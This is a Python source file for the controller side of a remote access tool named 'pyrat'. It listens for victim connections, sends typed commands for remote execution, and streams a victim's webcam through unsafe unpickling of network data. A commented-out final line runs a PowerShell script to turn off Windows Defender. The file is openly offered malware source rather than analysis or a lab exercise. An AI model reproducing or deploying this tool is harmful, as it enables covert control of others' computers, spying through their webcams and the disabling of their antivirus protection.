#                             __
#     ____  __  ___________ _/ /_
#    / __ \/ / / / ___/ __ `/ __/
#   / /_/ / /_/ / /  / /_/ / /_
#  / .___/\__, /_/   \__,_/\__/
# /_/    /____/
#
# Python remote access tool
# Development commenced on 22 November 2018
# Created by BigBanana (Discord: BigBanana#0001)
#
# Import needed modules
import sys
import socket
import numpy as np
import _pickle
import cv2
import time

# Beginning of main ----------------------------------------------------------------------------------------------------
def main():

    def printBan():
        print("""
			                             __
			     ____  __  ___________ _/ /_
			    / __ \/ / / / ___/ __ `/ __/
			   / /_/ / /_/ / /  / /_/ / /_
			  / .___/\__, /_/   \__,_/\__/
			 /_/    /____/
       """)
        print('[*]')
        print('[*] Python Remote access tool')
        print('[*] Development commenced on 22 November 2018')
        print('[*] Created by BigBanana (Discord: BigBanana#7626)')
        print('[*]')
        print('[!] Need help? Get started by typing "help"')
        print("")

    # Specify attacker's ip as HOST and a port to communicate through, instantiate socket
    def createSocket():
        try:
            global HOST
            global PORT
            global sock
            HOST = '0.0.0.0' #input("[!] Host: ")
            PORT = 4200
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as msg:
            print("Error creating socket: " + str(msg))

    # Reconnect if need be
    def recreateSocket():
        global sock
        global conn
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((HOST, PORT))
        sock.listen(10)
        conn, address = sock.accept()
        send_commands(conn)

    # Begin listening for a connection
    def bindSocket():
        try:
            global HOST
            global PORT
            global sock
            print("Connecting to " + str(HOST) + ':' + str(PORT))
            sock.bind((HOST, PORT))
            sock.listen(10)
        except socket.error as msg:
            print("Error binding socket: " + str(msg) + "\n" + "Retrying...")
            bindSocket()

    # Acknowledge a syn
    def acceptSocket():
        conn, address = sock.accept()
        print("[!] Connection established with " + str(HOST) + ':' + str(PORT))
        send_commands(conn)
        conn.close()

    # Send commands through socket
    def send_commands(conn):
        global HOST, PORT, sock
        while True:
            cmd = input("[!] " + str(HOST) + ">")
            if (cmd == 'quit'):
                conn.close()
                sock.close()
                sys.exit()
            if (len(str.encode(cmd)) > 0):
                if (cmd == 'help' or cmd == "Help"):
                    print("")
                    print("[!] Here is a list of runnable commands")
                    print("[*]  1. quit -- Ends session")
                    print("[*]  2. help -- Lists runnable commands")
                    print("[*]  3. free -- Closes tunnel")
                    print("[*]  4. webcam -- Watch through webcam")
                elif (cmd == "webcam"):
                    conn.send(str.encode(cmd))
                    conn.close()
                    sock.close()
                    webcamreceiver()
                    break
                elif (cmd == 'free'):
                    conn.close()
                    sock.close()
                    print("[!] Liberating connected devices.")
                else:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(1024), 'cp1252') # 'utf-8'
                    print(client_response)
                    print('')
                    conn.close()
                    sock.close()
                    recreateSocket()

    def startup():
        printBan()
        createSocket()
        bindSocket()
        acceptSocket()

    startup()
# END OF MAIN ----------------------------------------------------------------------------------------------------------

# Webcam streamer ------------------------------------------------------------------------------------------------------
def webcamreceiver():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.180", 4200))
    s.listen(10)

    conn, addr = s.accept()

    while True:
        try:
            data = conn.recv(128000)
            decode = _pickle.loads(data)
            frame = cv2.imdecode(decode, cv2.IMREAD_COLOR)
            cv2.imshow('Web Cam', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                conn.close()
                s.close()
                cv2.destroyAllWindows()
                break
        except:
            print("something went wrong")
            cv2.destroyAllWindows()
            break
    main()
# End of webcam streamer -----------------------------------------------------------------------------------------------
if __name__ == '__main__':
    main()

# Turn off defender
#  subprocess.Popen(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\spaze\\Desktop\\pentesting\\PyRat\\scripts\\tOFD.ps1"])